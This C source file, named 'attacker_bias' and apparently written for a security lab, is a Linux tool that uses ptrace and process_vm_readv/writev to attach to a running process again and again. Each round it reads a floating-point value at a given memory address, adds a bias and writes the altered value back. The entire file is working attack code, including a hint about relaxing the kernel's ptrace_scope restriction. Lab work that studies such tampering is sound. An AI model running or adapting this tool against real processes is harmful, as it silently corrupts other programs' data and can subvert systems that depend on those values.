#include "common.h"

#ifndef __linux__
#include <stdio.h>
int main(void) {
    fprintf(stderr, "attacker_bias only supports Linux (ptrace + process_vm_writev).\n");
    return 1;
}
#else

#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static volatile sig_atomic_t g_stop = 0; // 原子标志，用于停止攻击循环

static void on_sigint(int signo) {
    (void)signo;
    g_stop = 1;
}

static int read_remote_double(pid_t pid, uintptr_t addr, double *out) {
    struct iovec local = {
        .iov_base = out,
        .iov_len = sizeof(*out),
    }; // 描述了一块内存区域，iov_base 是起始地址，iov_len 是长度
    struct iovec remote = {
        .iov_base = (void *)addr,
        .iov_len = sizeof(*out),
    };
    ssize_t n = process_vm_readv(pid, &local, 1, &remote, 1, 0);
    if (n != (ssize_t)sizeof(*out)) {
        return -1;
    } // process_vm_readv 从远程进程的 remote 地址读取 sizeof(double) 字节到本地 out 指向的缓冲区
    return 0;
}

static int write_remote_double(pid_t pid, uintptr_t addr, double value) {
    struct iovec local = {
        .iov_base = &value,
        .iov_len = sizeof(value),
    };
    struct iovec remote = {
        .iov_base = (void *)addr,
        .iov_len = sizeof(value),
    };
    ssize_t n = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    if (n != (ssize_t)sizeof(value)) {
        return -1;
    }
    return 0;
}

static void usage(const char *prog) {
    fprintf(stderr,
            "Usage: %s <pid> <addr_hex> <bias> [interval_ms] [rounds]\n"
            "Example: %s 12345 0x55aabbccdde0 4.5 100 80\n",
            prog, prog);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        usage(argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)strtol(argv[1], NULL, 10);
    uintptr_t addr = (uintptr_t)strtoull(argv[2], NULL, 16);
    double bias = strtod(argv[3], NULL);
    int interval_ms = (argc > 4) ? atoi(argv[4]) : 100;
    int rounds = (argc > 5) ? atoi(argv[5]) : 120;

    if (pid <= 0 || addr == 0 || interval_ms <= 0 || rounds <= 0) {
        usage(argv[0]);
        return 1;
    }

    signal(SIGINT, on_sigint);
    signal(SIGTERM, on_sigint);

    printf("[attacker] pid=%d target_addr=0x%llx bias=%f\n",
           pid, (unsigned long long)addr, bias);

    for (int i = 0; i < rounds && !g_stop; ++i) {
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
            perror("ptrace(PTRACE_ATTACH)");
            fprintf(stderr,
                    "Hint: same user and /proc/sys/kernel/yama/ptrace_scope=0 can help in lab.\n");
            break;
        }
        if (waitpid(pid, NULL, 0) < 0) {
            perror("waitpid");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        double cur = 0.0;
        if (read_remote_double(pid, addr, &cur) < 0) {
            perror("process_vm_readv");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        double tampered = cur + bias;
        if (write_remote_double(pid, addr, tampered) < 0) {
            perror("process_vm_writev");
            (void)ptrace(PTRACE_DETACH, pid, NULL, NULL);
            break;
        }

        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
            perror("ptrace(PTRACE_DETACH)");
            break;
        }

        printf("[attacker] round=%d old=%.6f new=%.6f\n", i, cur, tampered);
        usleep((useconds_t)interval_ms * 1000U);
    }

    printf("[attacker] finished.\n");
    return 0;
}

#endif
